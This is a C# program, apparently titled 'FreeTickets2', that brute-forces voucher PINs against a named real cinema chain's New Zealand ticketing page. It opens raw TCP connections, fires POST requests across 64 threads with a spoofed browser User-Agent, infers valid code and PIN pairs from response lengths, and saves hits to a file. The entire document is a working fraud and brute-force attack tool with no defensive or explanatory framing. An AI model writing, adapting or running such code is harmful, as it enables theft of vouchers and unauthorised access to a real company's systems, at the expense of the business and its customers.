using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace FreeTickets2
{
    class Program
    {
        const string url = "http://www.hoyts.co.nz/times_and_tickets/tickets.aspx?c=1005&s=158545";
        const string d = "VouchIndex=6&Code={0}&Pin={1}&CinemaId=1005&SessionId=158545&uformpostroutevals=8A1BB4D13D3FE5B95B707FC69884665CF048674CF2821A4408BA167C034F6DA979C9DEF2E4D78BC6FEF97CA7058AAB6B0B3496903219962E97A49C840D00EE13BF08722F46F1132C6A27C01572A8942ECBFC23F78F24AFE239B2ED9D87F9313EFBE1844414D1C40189A133A5C50B31B20C9262B1C04EACA5C0AAD5A6A2B3E564B16D8AE6A48FE419306B09536B6EDE517BD5CD7F3DDDF6EFA31DE1B69E800B306A7C0B9D";
        const int num_threads = 64;
        private static int p;
        private static int total;

        static void Main(string[] args)
        {
            var startPin = int.Parse(args[1]);
            var endPin = int.Parse(args[2]);
            total = endPin - startPin;

            var numPerThread = (endPin - startPin)/num_threads;


            Thread[] theads = new Thread[num_threads];
            for (int i = 0; i < theads.Length; i++)
            {
                theads[i] = new Thread(Run);
                var f = startPin + numPerThread*i;
                theads[i].Start(new object[] { f, f + numPerThread, args[0]});
            }
        }

        private static void Run(object range)
        {
            var arr = (object[]) range;
            var startPin = (int)arr[0];
            var endPin = (int) arr[1];
            var code = (string)arr[2];
            
            var cookieJar = new CookieContainer();

            TcpClient client = new TcpClient("www.hoyts.co.nz", 80);
            var stream = new BufferedStream(client.GetStream());
            for (var pin = startPin; pin < endPin; pin++)
            {
                var a = string.Format(d, code, pin.ToString().PadLeft(4, '0'));
                string req =
                    "POST /times_and_tickets/tickets.aspx?c=1005&s=158545 HTTP/1.1\r\nHost: www.hoyts.co.nz\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n" +
                    "Accept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: " + a.Length + "\r\n\r\n" +
                    a;

                stream.Write(Encoding.UTF8.GetBytes(req), 0, req.Length);
                bool b;
                try
                {
                    var data = "";
                    while (!data.EndsWith("\r\n\r\n"))
                    {
                        var nextChar = stream.ReadByte();
                        data += Convert.ToChar(nextChar);
                    }
                    var l = data.LastIndexOf(' ');
                    int chars = int.Parse(data.Substring(l).Trim());
                    b = chars != 89 && chars != 193 && chars != 97;
#if DEBUG
                    var str = "";
                    while (chars-- > 0)
                    {
                        str += (char) stream.ReadByte();
                    }
                    Console.WriteLine(str);
#else
                    while (chars-- > 0) stream.ReadByte();
#endif

                }
                catch (Exception)
                {
                    try
                    {
                        client.Close();
                    }
                    catch (Exception)
                    {
                    }

                    try
                    {
                        client = new TcpClient("www.hoyts.co.nz", 80);
                        stream = new BufferedStream(client.GetStream());
                        Console.WriteLine("Resurrected");
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Something fucked up");
                    }
                    pin--;
                    continue;
                }
                if (b)
                {
                    Console.WriteLine($"{code}:{pin}");
                    File.WriteAllText("codes.txt", File.Exists("codes.txt") ? File.ReadAllText("codes.txt") + $"{code}:{pin}\n" : $"{code}:{pin}\n");
                    Environment.Exit(0);
                }
                else
                {
                    Console.Write($"\r{(float)++p/total*100}");
                }
            }
        }
    }
}
